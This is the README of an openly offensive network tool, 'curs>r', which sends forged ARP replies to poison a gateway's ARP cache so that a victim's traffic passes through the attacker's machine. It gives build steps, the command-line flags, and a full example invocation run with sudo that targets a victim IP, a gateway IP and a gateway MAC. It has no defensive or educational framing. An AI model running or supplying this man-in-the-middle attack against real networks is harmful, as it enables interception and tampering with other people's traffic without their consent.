# curs>r
A small tool to send malicious arp packets that poison the arp cache of gateway, so the victim's traffic is able to route to the attacker's machine.The curs>r name inspired by an 80s survival horror game in a netflix movie called "Choose or Die" where the game makes the players step into a surreal world of next-level terror and forces them to make choices with deadly consequences.

### Prerequisites
+ [CMake](http://www.cmake.org "CMake project page") (>= 3.17)

### Building
```bash
cd build
./builder.sh
```

### Usage
```bash
➜ ./curser -h
Usage:  curser [ -<flag> [<val>] | --<name> <val>] ]...

   -i, --interface-name       traffic output interface
   -o, --op-code              type of packet[req/rep]
       --victim-ip            victim ip address
       --dst-ip               gateway ip
       --dst-mac              gateway mac address
   -h, --help                 display usage information and exit
   -v, --version              display version information and exit
  
➜ sudo ./curser -i en0 -o rep --victim-ip 192.168.0.22 --dst-ip 192.168.1.1 --dst-mac 00:01:02:03:04:05
```
